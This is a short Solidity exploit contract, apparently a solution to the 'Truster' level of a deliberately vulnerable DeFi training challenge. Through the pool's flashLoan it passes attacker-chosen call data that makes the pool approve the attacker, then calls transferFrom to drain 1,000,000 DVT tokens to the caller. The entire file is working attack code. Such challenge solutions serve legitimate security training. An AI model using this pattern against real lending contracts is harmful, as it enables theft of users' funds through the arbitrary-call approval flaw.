// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";

contract ExploitTruster {
    TrusterLenderPool pool;
    IERC20 public immutable DVT;

    constructor(address _pool, address _tokenAddress) {
        pool = TrusterLenderPool(_pool);
        DVT = IERC20(_tokenAddress);
    }

    function exploit(
        uint256 _amount,
        address _borrower,
        address _target,
        bytes calldata _data) external {
            /* approves attacker to transfer */
            pool.flashLoan(_amount, _borrower, _target, _data);
            /* transfer from pool */
            DVT.transferFrom(address(pool), msg.sender, 1000000 ether);
        }
}
